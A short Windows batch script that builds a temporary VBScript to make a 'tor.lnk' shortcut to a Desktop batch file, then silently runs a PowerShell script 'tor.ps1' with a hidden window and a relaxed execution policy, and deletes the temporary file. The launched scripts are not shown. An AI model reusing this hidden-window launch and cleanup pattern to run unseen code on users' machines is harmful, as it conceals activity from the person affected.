@echo off
cls
echo Set oWS = WScript.CreateObject("WScript.Shell") > t.vbs
echo sLinkFile = "tor.lnk" >> t.vbs
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> t.vbs
echo oLink.TargetPath = "C:\Users\%username%\Desktop\craft_doodle\opentor.bat" >> t.vbs
echo oLink.Save >> t.vbs
cscript /nologo t.vbs
Powershell.exe -windowstyle hidden -executionpolicy remotesigned -File tor.ps1
del t.vbs
exit